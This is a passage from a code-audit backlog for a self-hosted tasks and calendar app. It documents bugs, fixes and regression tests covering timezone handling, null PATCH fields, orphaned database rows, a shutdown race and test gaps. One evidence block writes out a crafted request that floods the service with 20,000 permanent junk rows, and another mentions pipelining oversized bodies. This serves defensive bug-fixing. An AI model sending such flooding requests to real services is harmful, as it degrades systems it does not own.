`frontend/src/components/TaskModal.tsx:121` · **low** · rendering · `minor` · stage 4

TaskModal (the single-task create/edit form, opened from the Tasks list, the day columns and the calendar's task chips) registers no keydown listener anywhere, so Escape does nothing. Every other dialog in the app does: AddMultipleModal.tsx:280, AppearancePanel.tsx:49, DayPopover.tsx:85, SettingsMenu.tsx:105 and SchedulingView.tsx:243 — whose comment states it outright ("The modal contract every other dialog here keeps (see TabsModal): Escape …"). AUDIT filed and fixed exactly this against the booking-link editor, listing the modals that honour it ("Tabs/Appearance/Connections/Archived/Add-multiple") without noticing TaskModal is not among them; backlog.stage4.test.tsx asserts Escape for the booking editor and only the scrim behaviour for TaskModal.

<details><summary>Evidence</summary>

```
TaskModal.tsx has exactly one keyboard handler — `onKeyDown` on the title input, which only handles Enter (line 140) — and no `window.addEventListener('keydown', …)`. `grep -n Escape frontend/src/components/TaskModal.tsx` returns nothing.

Failure: the user clicks a task row, the dialog opens, they press Escape to back out (the gesture every other dialog in this app answers). Nothing happens; the only ways out are the ✕ button or a press-and-release both landing on the scrim. With `aria-modal="true"` and no focus trap either, a keyboard or screen-reader user has no keyboard route out of the dialog at all.
```

</details>

**Suggested fix.** Add the same effect the other modals use: `useEffect(() => { const onKey = (e: KeyboardEvent) => { if (e.key === 'Escape') onClose() }; window.addEventListener('keydown', onKey); return () => window.removeEventListener('keydown', onKey) }, [onClose])`, and add a regression test beside the two scrim tests in backlog.stage4.test.tsx.

**Fixed** with a new `useEscape` hook in `hooks.ts`, bound to `window` — the
widest of the three spellings already in the tree, and one that subsumes the
`document` variant since a document keydown bubbles to the window.

**Only `TaskModal` adopts it.** The other five dialogs inline the same effect and
are left alone: one guards on `busy`, one works around React's `KeyboardEvent`
type shadowing, one binds `document`. Converting five working dialogs to close one
finding is how the Stage 3 regressions got in. The consolidation is filed below.

Widened to dispatch at `document` and at `window`, not only at the dialog. The
original fired the key at the dialog, where a handler on ANY ancestor passes —
including one on the modal element itself, which only fires while focus is inside
the dialog. With no focus trap, focus outside it is exactly the state a keyboard
user needs the escape hatch from. That handler is the half-fix, and the widened
cases catch it.

**Pinned by** `aug19 stage 4b — TaskModal > closes on Escape, like every other dialog in the app` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

### HTTP API — request models

#### [x] A zone-offset datetime accepted by _parse_datelike is written as TZID="UTC±HH:MM" and read back as floating — the instant silently moves

`backend/tasksd/app.py:531` · **medium** · bug · stage 3

`_parse_datelike` (and `_event_dt`, which delegates to it) returns `datetime.fromisoformat(...)` verbatim, so an offset-bearing value such as `2026-08-10T09:00:00-07:00` becomes a datetime whose tzinfo is a fixed-offset `datetime.timezone`. Nothing at the HTTP edge, in `service.create_event`/`create_task`, or in `ical.build_new_event`/`build_new` normalizes it: `event.add("DTSTART", dtstart)` receives it raw. `icalendar` serializes a fixed-offset tzinfo as a fabricated `TZID="UTC-07:00"`, which no CalDAV client (and not even this app's own reader) can resolve, so the value comes back FLOATING — the offset is discarded and the instant shifts by the whole offset.

The seam is that `ical/edit.py::_set_datelike` documents this exact trap ("Writing that offset verbatim makes icalendar fabricate `TZID="UTC+02:00"` — a zone name no other CalDAV client can resolve") and defends against it, but only when the property being overwritten is ALREADY zone-aware:

    if (isinstance(value, datetime) and value.tzinfo is not None
            and isinstance(old_dt, datetime) and old_dt.tzinfo is not None):
        value = value.astimezone(old_dt.tzinfo)

On a create there is no `old_dt` at all, and on a PATCH of a floating property (which is what all of this app's own writes are) or of an absent DUE the guard never fires. So the comment covers one of three cases and makes the other two look handled. Zero-offset input is safe by accident (Python normalizes `+00:00`/`Z` to `timezone.utc`, which icalendar emits as a plain `...Z`); every non-zero offset is corrupted.

<details><summary>Evidence</summary>

```
Reproduced against the repo's own modules (backend/, deps installed):

    from tasksd.ical import build_new_event, build_new, TaskEdit
    from tasksd.ical import read as R
    raw = build_new_event('u@tasksd', summary='S',
            dtstart=datetime.fromisoformat('2026-08-10T09:00:00-07:00'),
            dtend=datetime.fromisoformat('2026-08-10T09:30:00-07:00'))

  ->  DTSTART;TZID="UTC-07:00":20260810T090000
      DTEND;TZID="UTC-07:00":20260810T093000
      R.extract_from_raw(raw).dtstart == '2026-08-10T09:00:00'   # offset GONE, now floating

    raw = build_new('u@tasksd', summary='S',
            edit=TaskEdit(due=datetime.fromisoformat('2026-08-10T17:00:00-07:00')))
  ->  DUE;TZID="UTC-07:00":20260810T170000
      R.extract_from_raw(raw).due == '2026-08-10T17:00:00'

Control: the same call with `+00:00` or `Z` yields `DTSTART:20260810T090000Z` and reads back as `2026-08-10T09:00:00+00:00`, so only non-zero offsets are affected.

Concrete failure: an MCP connector holding a write grant calls `smylte_create_event` (whose schema description says "otherwise give ISO datetimes") with `start="2026-08-10T09:00:00-07:00"` for a 09:00 Pacific meeting, or any script POSTs the same to `/api/calendars/{cal}/events`. The VEVENT on Radicale carries `TZID="UTC-07:00"`; the cache stores start `2026-08-10T09:00:00` with no zone. `scheduling.parse_event_time` reads a naive start in `home_timezone` (say Europe/Berlin), so the busy interval is placed at 09:00 Berlin instead of 18:00 Berlin. `GET /api/public/booking/{token}` therefore advertises 18:00–18:30 Berlin — a slot the owner is genuinely in a meeting for — as free to an anonymous visitor, and blocks 09:00 which is actually free. Thunderbird/DAVx5/jtx see an unresolvable TZID on the same resource.

No test anywhere sends an offset-bearing datetime to any create or patch route.
```

</details>

**Suggested fix.** Normalize at the edge, in `_parse_datelike` (which every date-bearing field funnels through): after `datetime.fromisoformat(...)`, if the result is aware and its tzinfo is a bare fixed offset (`isinstance(dt.tzinfo, timezone)` rather than a `ZoneInfo`), return `dt.astimezone(timezone.utc)`. icalendar serializes UTC as `...Z`, which round-trips losslessly, and `_set_datelike`'s existing re-expression into an old property's real tzinfo still works from a UTC value. Add a test asserting that `POST /api/calendars/{c}/events {"start": "2026-08-10T09:00:00-07:00"}` produces `DTSTART:20260810T160000Z` and reads back with the offset intact.

**Pinned by** `test_an_event_created_with_a_zone_offset_keeps_the_instant_it_names` in `backend/tests/test_backlog_aug19_stage3_ical.py`.

### HTTP API — routes

#### [x] PATCH /api/scheduling/links/{token} with an explicit null 500s and leaves a half-applied update behind

`backend/tasksd/app.py:1161` · **medium** · bug · stage 1

`EditBookingLink` types every field as `X | None`, and `patch_booking_link` selects fields by `model_fields_set`, so an explicitly-sent JSON `null` is a *set* field whose value is `None` and is forwarded verbatim:

```python
fs = body.model_fields_set          # only fields the client actually sent
fields = {k: getattr(body, k) for k in _LINK_SIMPLE_FIELDS if k in fs}
...
dto = await _run(_svc(request).update_booking_link, token, fields)
except ValueError as e:
    raise HTTPException(422, str(e)) from None
```

`_normalize_link_fields` (service.py:667) only rescues three of them — `timezone` (ZoneInfo(None) raises → 422), `availability` (parse_availability(None) → {}), and `show_busy`/`enabled` (`int(bool(None))` → 0). `title`, `duration_minutes`, `buffer_minutes`, `min_notice_hours` and `horizon_days` pass through untouched, and all five are `NOT NULL` in db/schema.sql:146-161. `store.update_booking_link` (store.py:535-541) then issues one `UPDATE booking_links SET <col>=?` per field and SQLite raises `sqlite3.IntegrityError`, which is not a `ValueError` and matches none of the registered exception handlers (app.py:808-857) — so it escapes as a 500.

Worse, that loop is not a transaction. `store.connect` uses `isolation_level=None` (autocommit, store.py:52) and `service.update_booking_link` (service.py:700-708) wraps the call in the service lock but not in `store.tx()` — the discipline `reorder_tasks` explicitly adopted for exactly this reason (service.py:444-452). Because `fields` preserves `_LINK_SIMPLE_FIELDS` order, every UPDATE before the failing one is already committed.

The HTTP layer is the *only* door with this hole: the MCP tool for the same operation declares `"title": {"type": "string"}` and mcp/validate.py rejects a null before it reaches the service, so `smylte_update_booking_link` is safe while the route it mirrors is not.

<details><summary>Evidence</summary>

```
State: a booking link exists with token T, title "Coffee chat", horizon_days 30.

Request (authenticated, valid JSON, passes pydantic):
  PATCH /api/scheduling/links/T
  {"title": "Intro call", "horizon_days": null}

- `fs` = {"title", "horizon_days"}; `fields` = {"title": "Intro call", "horizon_days": None} (dict order from _LINK_SIMPLE_FIELDS).
- `_normalize_link_fields` touches neither key.
- store.update_booking_link: `UPDATE booking_links SET title=? ...` commits (autocommit).
- next iteration: `UPDATE booking_links SET horizon_days=NULL ...`
  -> sqlite3.IntegrityError: NOT NULL constraint failed: booking_links.horizon_days
- No handler matches -> HTTP 500.

Result: the caller is told the request failed, but the title was permanently changed. A retry of the same body 500s again forever.

The single-field form `{"duration_minutes": null}` (or title/buffer_minutes/min_notice_hours/horizon_days) is a bare 500 on an authenticated route.

No test covers it: tests/test_scheduling.py:481 `test_owner_link_crud` only patches real values and asserts 422 for a bad timezone and a bad availability range; nothing sends an explicit null to any field.
```

</details>

**Suggested fix.** Drop `None` values from `fields` for every column that is NOT NULL (keeping only `description`, the one nullable column, as a legitimate "clear it" — or, better, declare the non-nullable fields on `EditBookingLink` so pydantic rejects a null with 422). Independently, wrap the per-field UPDATE loop in `store.tx(conn)` inside `service.update_booking_link` so a failure part-way cannot leave a partly-applied link. Add a test that PATCHes each field with `null` and asserts 4xx plus an unchanged row.

**Pinned by** `test_a_null_booking_link_field_is_refused_not_a_half_applied_500` in `backend/tests/test_backlog_aug19_stage1.py`.

#### [x] POST /api/tasks/reorder writes permanent, unreclaimable sidecar rows for uids that do not exist

`backend/tasksd/app.py:1042` · **low** · bug · `minor` · stage 3

`reorder_tasks` validates only that each entry's *list* resolves (404) and that no `(href, uid)` pair repeats (422). The `uid` itself is an unbounded free-text string that is never checked against anything:

```python
key = (href, item.uid)
if key in seen: ... 422
seen.add(key); placed.append(key)
await _run(svc.reorder_tasks, placed)
```

`store.set_sort_orders` (store.py:484-491) then does `INSERT INTO sidecar (collection_href, uid, sort_order) VALUES (?,?,?) ON CONFLICT ... DO UPDATE` — creating a row with `orphaned_at IS NULL` for any uid at all. `orphan_sidecar` (store.py:393) is only ever called when a *known* item is deleted or a collection is soft-deleted, and `gc_orphans` (store.py:425-445) sweeps only `WHERE orphaned_at IS NOT NULL`, so such a row can never be reclaimed for the life of the list.

This is precisely the defect the 2026-08-07 sweep closed for `PUT .../tasks/{uid}/sidecar` — app.py:1045-1059 now carries a `has_task` guard and a nine-line comment explaining that sidecar rows are the one thing a resync cannot rebuild, so these rows are permanent. `reorder_tasks` writes to the same table through a different door with no such guard, and `ReorderTasks.items` allows 20 000 entries per request.

<details><summary>Evidence</summary>

```
Realistic trigger (two clients, which is the normal case for this app):
1. The SPA holds task X in list L (from /api/lists/L/tasks, or from the localStorage cache replayed at load).
2. Tasks.org/DAVx5 deletes X on the phone. The next sync purges it from `items` and marks its sidecar orphaned.
3. The user drags any row in the tasks pane. The client sends its whole in-memory array — which still contains X — to POST /api/tasks/reorder.
4. `set_sort_orders` re-INSERTs `('/user/L/', 'X', n)` with `orphaned_at IS NULL`. `gc_orphans` can never remove it again; the row that was correctly orphaned in step 2 is resurrected permanently.

Deliberate form, from any authenticated client:
  POST /api/tasks/reorder {"items": [{"list": "<real-list>", "uid": "ghost-%d" % i} for i in range(20000)]}
  -> 200 {"ok": true}; 20 000 permanent sidecar rows, repeatable with fresh uids.

Compare the sibling route, which is tested: tests/test_api.py:895 `test_a_sidecar_put_for_an_unknown_task_is_a_404_and_writes_nothing` asserts `count(*) FROM sidecar` is unchanged for an unknown uid. tests/test_api.py:951 `test_task_reorder_rejects_a_bad_body` only exercises an unknown *list* ({"list": "nope", "uid": "x"} — it 404s on the list, never reaching the uid) and a duplicate pair. Nothing sends a valid list with an unknown uid.
```

</details>

**Suggested fix.** In `reorder_tasks`, drop (or 422) entries whose uid is not a live task in the resolved collection — e.g. fetch `store.get_items(conn, href)` once per distinct href inside `TaskService.reorder_tasks` and skip pairs that do not match, or add the existence check to `store.set_sort_orders` (`INSERT ... WHERE EXISTS (SELECT 1 FROM items WHERE collection_href=? AND uid=?)`). Add a test that a reorder naming an unknown uid leaves `count(*) FROM sidecar` unchanged.

**Pinned by** `test_a_reorder_naming_an_unknown_uid_writes_no_sidecar_row` in `backend/tests/test_backlog_aug19_stage3_core.py`.

#### [x] Shutdown tears down the SQLite connection and DAV client under a still-running sync sweep

`backend/tasksd/app.py:774` · **low** · bug · `minor` · stage 5

The lifespan teardown assumes cancelling the sync task stops the sync:

```python
finally:
    loop_task.cancel()
    with contextlib.suppress(asyncio.CancelledError):
        await loop_task
    svc.close()
```

`_sync_loop` (app.py:655-666) spends its time in `await asyncio.to_thread(svc.sync_all)`. Cancelling the awaiting task marks the asyncio future cancelled immediately, but `concurrent.futures.Future.cancel()` fails on an already-running work item, so `await loop_task` returns at once while the worker thread keeps executing `sync_all`.

`sync_all` (service.py:131-155) deliberately releases the global lock between collections ("Lock per collection, not for the whole sweep"). `svc.close()` (service.py:76-79) takes that same lock, so it acquires it in one of those gaps and closes both `self._dav` and `self._conn` while the sweep is still iterating. The sweep's next slice then runs `store.has_collection(self._conn, href)` — which sits *outside* the per-collection `try/except Exception` — against a closed connection.

<details><summary>Evidence</summary>

```
Sequence on any `systemctl restart tasks` (or SIGTERM) that lands mid-sweep — with the default 30 s sync interval and a sweep that takes seconds per collection (each `engine.sync(href)` is a CalDAV REPORT with a 30 s timeout), this is a routine overlap, not a rare one:

  t0  worker thread: sync_all, inside `with self._lock: engine.sync('/u/cal-a/')`
  t1  uvicorn shutdown -> lifespan finally -> loop_task.cancel()
  t2  `await loop_task` returns immediately (CancelledError suppressed); the thread is untouched
  t3  worker releases the lock at the end of the cal-a slice
  t4  svc.close() acquires the lock, calls self._dav.close() and self._conn.close()
  t5  worker takes the lock for '/u/cal-b/' and calls store.has_collection(self._conn, ...)
      -> sqlite3.ProgrammingError: Cannot operate on a closed database.

`store.has_collection` is called before `try:` in sync_all's loop body, so the exception escapes sync_all entirely. Nothing awaits that executor future any more, so asyncio logs an "exception was never retrieved" traceback on every such restart, the remaining collections are never swept, and the httpx client is closed under whatever request was about to be issued. The whole HTTP suite drives the app through TestClient one request at a time and never has a sweep in flight at teardown, so nothing catches it.
```

</details>

**Suggested fix.** Give `TaskService` a `_closed` flag set under the lock in `close()` and checked at the top of each `sync_all` slice (returning early), or have the lifespan wait for the in-flight sweep before closing — e.g. keep a reference to the thread/future and `await asyncio.wait_for(shield(...))` with a short bound before `svc.close()`. Either way `close()` must not run concurrently with a live sweep.

**Was not pinned**, and the note explaining why asked whoever fixed this to add
a seam between two slices of `sync_all` so teardown could be ORDERED against the
sweep rather than raced with it.

**Fixed** with the `_closed` flag this entry suggests: set under the lock in
`close()`, checked under the lock at the top of `sync_all` *and again on every
slice*. `close()` is also idempotent now, since teardown can run twice.

**The seam turned out not to be needed, and no production code grew a test
hook.** What was flaky was the RACE — whether `close()` happens to win the gap
between two slices. The fix's invariant is not a race at all: a closed service
must not touch its connection, whenever it was closed. Two pins assert exactly
that and both fail deterministically against the old code. The mid-sweep case is
driven by making the ENGINE's `sync` call `close()` when it is invoked for the
first collection, which puts the teardown precisely where this entry says it
lands — a stub in the test, not a hook in the service.

Half-fix checked: guarding only at the top of `sync_all` and not per slice
leaves the mid-sweep pin failing, which is the whole point of the finding —
`sync_all` releases the lock between collections deliberately, so one check at
the top proves nothing about the sixth slice.

The control is the one that matters. The fix is a guard that returns early, and
the failure mode of any such guard is returning early *always*: `_closed`
starting `True` satisfies both pins completely and turns background sync into a
silent no-op — the app simply stops seeing anything changed in another client,
with no error anywhere. Verified that it fails the control.

The race itself is still not pinned, and that is recorded rather than dropped:
nothing here proves the interleaving is impossible, only that it is now
harmless.

### Service layer

#### [x] resolve_list ignores the collection's component set, so a task can be written into a VEVENT-only calendar (and an event into a VTODO-only list) and then never read back

`backend/tasksd/service.py:210` · **medium** · bug · stage 3

The READ side of this service is strictly segregated by component: `list_lists` filters `"VTODO" in components` (171-172), `list_calendars` filters `"VEVENT" in components` (467-468), `get_task`/`list_tasks` filter `component == "VTODO"`, `get_event` filters `"VEVENT"`, and `_link_busy` skips any collection without VEVENT (758-759). `test_api.py::test_tabs_are_separated` asserts this separation is intentional.

The WRITE side has no such check. `resolve_list` matches on href-or-slug alone and returns any live collection. It is the sole resolver behind every `/api/lists/...` and `/api/calendars/...` route (`app.py::_href`, line 898) and behind both MCP resolvers (`mcp/api.py::_href`, line 177 — including `kind="calendar"`, whose only effect is the wording of the error message). `SyncEngine.create_task`/`create_event`/`move_event` guard with `store.has_collection`, which checks existence and `deleted=0` and nothing about components.

The one place that does check is `_normalize_link_fields` (683-687): `"calendar must be an existing event calendar"`. So the need for the check was recognised and applied to exactly one caller.

<details><summary>Evidence</summary>

````
service.py:210-216:
```python
def resolve_list(self, list_id: str) -> str | None:
    """Accept either a full href or the short slug; return the href."""
    with self._lock:
        for row in store.get_collections(self._conn):
            if list_id in (row["href"], _slug(row["href"])):
                return row["href"]
```

Run against the real service with a DAV stub that accepts the PUT (Radicale does not enforce `supported-calendar-component-set` on upload):

    collections: /u/cal/ (VEVENT only, "Work cal"), /u/tasks/ (VTODO only, "Inbox")

    s.create_task("/u/cal/", "buy milk")     -> 201, uid=...@tasksd, list="cal"
    McpApi(s).list_tasks()                   -> []          <- the model can never see it
    s.list_lists()                           -> ['tasks']   <- the Tasks tab can never see it
    s.list_calendars()[0] counts             -> {'open_count': 1, 'task_count': 1,
                                                 'event_count': 0, 'total': 1}
    s.search("milk")                         -> [('buy milk', 'cal')]

Failure scenario: the model calls `smylte_create_task(list_id="cal", summary="buy milk")` after picking an id out of `smylte_list_calendars` instead of `smylte_list_lists` — `_href(list_id)` resolves it, the VTODO is PUT to the calendar, and the tool returns a normal success DTO. `smylte_list_tasks` (which fans out over `list_lists()`) never returns it again, so the model reports the task created and it is gone. The owner sees a Calendar tab entry reading "1 open" on a calendar that shows no events. Symmetrically `smylte_create_event(calendar_id=<task-list id>)` and `POST /api/calendars/{task_list_id}/events` write a VEVENT into a VTODO-only list: it is invisible in the Calendar grid AND invisible to `_link_busy`, so the public booking page will offer that hour as free. `move_event` into a VTODO-only list (engine.move_event:341) has the same hole. The one search path that does surface such a row hands back a `list` id that is not in the Tasks view's list array, so the frontend's color/visibility lookup misses too.
````

</details>

**Suggested fix.** Give the resolver the component it is resolving for: `resolve_list(list_id, *, component: str | None = None)` returning None unless `component in (row["components"] or "")`. Pass `"VTODO"` from the `/api/lists/...` item routes and `McpApi._href(kind="list")`, `"VEVENT"` from the `/api/calendars/{id}/events*` routes, `move_event`'s destination and `McpApi._href(kind="calendar")`; leave the shared collection-management routes (PATCH/DELETE/reorder) unfiltered since they deliberately span both. Add tests asserting `POST /api/lists/{calendar_id}/tasks` and `POST /api/calendars/{list_id}/events` both 404.

**Pinned by** `test_a_task_cannot_be_written_into_an_event_only_calendar` in `backend/tests/test_backlog_aug19_stage3_core.py`.

### Test suite

#### [x] setup.ts's matchMedia stub hardcodes the desktop breakpoint, so CalendarView's and HomeView's entire mobile renders are never exercised

`frontend/src/test/setup.ts:5` · **medium** · test-gap · stage 5

The global stub answers `matches: false` for every query and its `addEventListener` is a no-op, so `useIsMobile()` is permanently false and can never change mid-mount in any suite that does not override it. Only Sidebar.test.tsx, SettingsMenu.test.tsx and hooks.test.ts override it. CalendarView and HomeView both branch on `useIsMobile()` and neither test file touches matchMedia, so their mobile trees are never rendered by any test. These are not cosmetic branches: CalendarView.tsx:534-538 changes what a tap on a day cell MEANS (`if (isMobile && key !== focusDay) setFocusDay(key); else setDraft({date: key})` — on a phone the first tap must focus the day, not open the new-event modal), CalendarView.tsx:541 swaps chips for `.ev-dots`, CalendarView.tsx:638-658 renders the whole `.day-agenda` panel (its `+ Event` button, `AgendaEvent`/`AgendaTask` rows and the "Nothing this day." empty state), and CalendarView.tsx:422 disables the fixed-grid mode (`fit === 'fixed' && !isMobile`) that was just shipped. HomeView.tsx:189-208 returns an entirely different component tree.

<details><summary>Evidence</summary>

```
$ grep -rln "matchMedia" frontend/src --include="*.test.ts*"
    frontend/src/components/Sidebar.test.tsx
    frontend/src/components/SettingsMenu.test.tsx
    frontend/src/hooks.test.ts

CalendarView.test.tsx (592 lines) and HomeView.test.tsx (432 lines) are absent, and setup.ts installs `matches: false` unconditionally. Concrete scenario: change CalendarView.tsx:537 from `if (isMobile && key !== focusDay)` to `if (false)` — every phone tap on any day now opens the event composer instead of focusing the day, `.day-agenda` becomes unreachable, and all 592 lines of CalendarView.test.tsx plus the rest of `npm test` stay green. Equally, deleting HomeView.tsx's `if (isMobile) { ... }` block (phones would get the desktop drag grid) fails nothing.
```

</details>

**Suggested fix.** Add a mobile `describe` block to CalendarView.test.tsx and HomeView.test.tsx using the same `stubMatchMedia(true)` helper Sidebar.test.tsx already defines (lines 104-112), and assert the behaviours the branch exists for: (1) render CalendarView on mobile, click a non-focused day cell and assert `screen.queryByRole('dialog')` is null while `.cal-cell.focus` moved to that day; a second click on the same cell opens the draft; (2) assert `.day-agenda` lists exactly the focused day's events and shows "Nothing this day." for an empty one; (3) assert `.ev-dots i` renders instead of `.cal-chip`; (4) assert `fit="fixed"` does NOT apply the fitted grid on mobile; (5) render HomeView on mobile and assert `.dash-stack > .dash-mod` appears in `y`-then-`x` order with no drag handles. Also give the shared stub in setup.ts a real listener set so a suite can emit a breakpoint change without replacing the stub wholesale.

**Pinned by** `aug19 stage 4b — the mobile breakpoint > renders the mobile calendar and the mobile dashboard` in `frontend/src/backlog.aug19.stage4b.test.tsx`.

**Closed.** The five behaviours this entry enumerates are driven, and the
mutation it names — `if (isMobile && key !== focusDay)` → `if (false && …)` —
fails the pin.

The other half of the suggested fix was still outstanding and is done here:
`test/setup.ts`'s shared stub now keeps a **real listener registry**, with
`setBreakpoint`, `breakpointListeners` and `resetBreakpoint` exported, so a
suite can cross the breakpoint without replacing the stub wholesale. That
mattered more than it looked: every mobile assertion in the tree installed a
stub whose `addEventListener` is a no-op and then mounted, which exercises
`useState(() => matchMedia(…).matches)` and never the effect underneath — and
the effect is the whole reason `useIsMobile` is not a plain read. A rotation, a
resize or the devtools device toolbar crosses the breakpoint without remounting
anything. `hooks.test.ts` drove that change against `renderHook`, the hook alone
with no component reading it; nothing asserted a real view answers it.

A new case does, through the shared stub: desktop → mobile → desktop on a
mounted `CalendarView`, asserting the same `.cal-scroll` node throughout (a
re-render, not a remount — otherwise the assertions would pass while saying
nothing about the effect), and that unmounting unsubscribes. Both mutations
caught: deleting the `addEventListener` call, and dropping the cleanup.

#### [x] No test observes anything about a 204 beyond its status code, and the source comment states the suite is green either way

`backend/tests/test_api.py:76` · **low** · test-gap · `minor` · stage 5

docs/AUDIT.md:2614 closed "Every DELETE route sends a body on a 204, raising RuntimeError inside the ASGI app and killing the connection on each delete". The fix is `return Response(status_code=204)` at tasksd/app.py:955, and the comment above it says outright: "TestClient bypasses the protocol layer, which is why the suite is green either way — check against a real server if you touch this." That is accurate, and it means the fix is guarded by nothing but a comment: all eleven 204 assertions in the suite (test_api.py:76, 252, 344, 392, 575, 691; test_mcp.py:650; test_scheduling.py:507, 701) check `status_code == 204` only. The suite already knows the stronger idiom — test_mcp.py:263 asserts `r.status_code == 202 and not r.content` — it is just never applied to the deletes. `requirements.txt` pins only `fastapi>=0.115`, so which serialization a 204 gets is decided by whatever pip resolves on the day.

<details><summary>Evidence</summary>

```
$ grep -rn "204" backend/tests/*.py | grep -v backlog
    ... every hit is `.status_code == 204`; no `.content`, no header assertion.

I reproduced the observable difference against the installed stack (fastapi 0.141.1 / starlette 1.6.0):

    @app.delete("/bad", status_code=204)
    async def bad(): return None                      # the pre-fix shape
    @app.delete("/good", status_code=204)
    async def good(): return Response(status_code=204)

    /bad  -> http.response.start status=204 headers=[(b'content-type', b'application/json')]
    /good -> http.response.start status=204 headers=[]

Concrete scenario: revert tasksd/app.py:955 to `return None` (or to any serialized value, as a refactor threading the service result through would). Every test in the suite still passes, while the response carries a Content-Type on a bodiless status — and on the FastAPI/Starlette version the finding was originally filed against it carries a `null` body, which is what tore down the keep-alive socket on every delete.
```

</details>

**Suggested fix.** Assert the shape of the 204, not just its number. Cheapest: in test_api.py, after `r = client.delete(f"/api/lists/{lid}/tasks/{sub['uid']}")`, add `assert r.status_code == 204 and r.content == b"" and "content-type" not in r.headers and "content-length" not in r.headers`. Stronger, and immune to the TestClient blind spot the comment names: drive one DELETE straight against the ASGI app with a scripted send channel (the technique test_sse.py::_drive_stream already uses) and assert the captured `http.response.start` message carries no `content-length` header and the `http.response.body` message has `body == b""`.

**Pinned by** `test_a_204_delete_carries_no_body_and_no_content_type` in `backend/tests/test_backlog_aug19_stage45.py`.

**Closed**, and with the stronger of the two options this entry offers: the
assertion runs through TestClient *and* by driving the ASGI app directly, so the
`http.response.start` message itself is examined — the blind spot the source
comment names. Verified by the mutation the entry names: reverting
`return Response(status_code=204)` to `return None` fails it on the
`content-type: application/json` a bodiless status must not carry.

#### [x] The won't-do write route and its MCP twin have no behavioural test at all — only a comment in test_api.py claims otherwise

`backend/tests/test_api.py:69` · **low** · test-gap · `minor` · stage 5

`POST /api/lists/{list_id}/tasks/{uid}/cancel` (tasksd/app.py:1003) and `TaskService.cancel_task` (tasksd/service.py:423) write `STATUS:CANCELLED`, and `smylte_cancel_task` (tasksd/mcp/tools.py:316) exposes the same operation to a connector. Neither is called by any test. The only thing that looks like coverage is the comment `# complete + won't-do` at test_api.py:69, which sits above a block that exercises `/complete` and `/complete?done=false` and nothing else — the comment is the sole reason the path reads as covered. `cancelled` is a first-class Task DTO field that `list_tasks(include_done=False)` filters on (`if not (d["completed"] or d["cancelled"])`, service.py:227) and that the SPA's show-completed filter and "View completed" pane both key on, yet no test ever produces a task with it set through the API.

<details><summary>Evidence</summary>

```
$ grep -rn "cancel" backend/tests/*.py | grep -v "notifications/cancelled" | grep -v CANCELLED
    (only unrelated hits: a dict literal in test_backlog_stage3.py and the workflow's cancel-in-progress assertion)

`test_every_api_route_requires_auth` reaches the route, but only asserts it 401s without a cookie. Concrete scenario: change `cancel_task` to `TaskEdit(status="COMPLETED")` (or drop `d["cancelled"]` from the include_done filter). Every backend test still passes, while "won't do" becomes indistinguishable from "done" in the DTO other CalDAV clients read back, or a cancelled task never leaves the open list.
```

</details>

**Suggested fix.** Add to test_api.py, in test_task_crud_and_subtasks or beside it:

    t = client.post(f"/api/lists/{lid}/tasks", json={"summary": "skip it"}).json()
    cancelled = client.post(f"/api/lists/{lid}/tasks/{t['uid']}/cancel").json()
    assert cancelled["cancelled"] is True and cancelled["completed"] is False
    assert cancelled["status"] == "CANCELLED"
    open_uids = {x["uid"] for x in client.get(f"/api/lists/{lid}/tasks",
                                              params={"include_done": False}).json()}
    assert t["uid"] not in open_uids
    assert t["uid"] in {x["uid"] for x in client.get(f"/api/lists/{lid}/tasks").json()}
    assert client.post(f"/api/lists/{lid}/tasks/no-such-uid/cancel").status_code == 404

and one MCP-level case driving `smylte_cancel_task` (including that it is refused on a read-only grant, which is untested for this tool too).

**Pinned by** `test_cancelling_a_task_is_wont_do_and_not_done + test_the_cancel_tool_needs_write_access_and_marks_the_task_wont_do` in `backend/tests/test_backlog_aug19_stage45.py`.

**Closed**, both halves: the API route and the connector twin, the latter
including that a read-only grant cannot reach `smylte_cancel_task` — untested
for this tool as the entry notes. Verified by both mutations it names: making
`cancel_task` write `COMPLETED` (caught), and dropping `d["cancelled"]` from the
`include_done=False` filter so a won't-do task never leaves the open list
(caught).

### Auth, session & limits

#### [x] The body-limit middleware's 413 is dead code on every FastAPI route — FastAPI swallows _BodyTooLarge and answers 400, and no test covers the chunked path through the real app

`backend/tasksd/limits.py:73` · **low** · bug · `minor` · stage 1

`BodySizeLimitMiddleware` raises a private `_BodyTooLarge` out of `counting_receive` and catches it around the inner app to emit the 413 (with `Connection: close`):

    try:
        await self.app(scope, counting_receive, watching_send)
    except _BodyTooLarge:
        if not started:
            await _too_large(send, self.max_bytes)

That `except` never fires for a FastAPI route. FastAPI's `get_request_handler` (fastapi/routing.py:451-472) wraps the body read in `except json.JSONDecodeError / except HTTPException / except Exception as e: raise HTTPException(400, "There was an error parsing the body")`. `_BodyTooLarge` is an ordinary `Exception`, so FastAPI converts it into a 400 before the middleware ever sees it — the `started` flag, the `_too_large` fallback and the `Connection: close` header are all unreachable on the router path.

The memory bound itself still holds (the stream really is cut at the first over-cap chunk), so this is a contract/observability defect rather than a hole. But the module docstring, `_too_large`'s comment ("The body was refused unread, so the connection cannot be reused") and the test suite all assert a 413 that the app does not actually produce, and the connection is left reusable so an attacker can pipeline oversized bodies on one socket.

The test gap is why this survived: `test_a_chunked_body_is_cut_at_the_cap_not_buffered_whole` (tests/test_body_limit.py:72-88) mounts the middleware over a bare `_echo_len` ASGI app, not over FastAPI, so it exercises a stack the app never runs. The only app-level test, `test_a_huge_login_body_is_refused_before_the_route_runs` (:91-98), uses `json=` — which sets Content-Length, taking the cheap pre-check branch at limits.py:39-42 and never reaching the counting path at all. Nothing in the suite drives a chunked over-cap body through `create_app`.

<details><summary>Evidence</summary>

```
Reproduced with the app's own two middlewares over a FastAPI route carrying the real `Login` model:

    app.add_middleware(BodySizeLimitMiddleware, max_bytes=4096)
    app.add_middleware(CSPMiddleware, policy=build_policy([]))

    # chunked, no Content-Length, 200 x 64 KiB offered
    r = await c.post("/api/login", content=chunks(), headers={"Content-Type":"application/json"})

    chunked -> 400 {"detail":"There was an error parsing the body"}  produced 65536
    normal  -> 200

`produced == 65536` confirms the stream is cut after one chunk (the security property survives), but the status is 400, the body is FastAPI's generic parse error rather than `{"detail":"request body exceeds N bytes"}`, and no `Connection: close` is sent.

fastapi/routing.py:466-472 is the interceptor:

    except HTTPException:
        raise
    except Exception as e:
        http_error = HTTPException(status_code=400, detail="There was an error parsing the body")
```

</details>

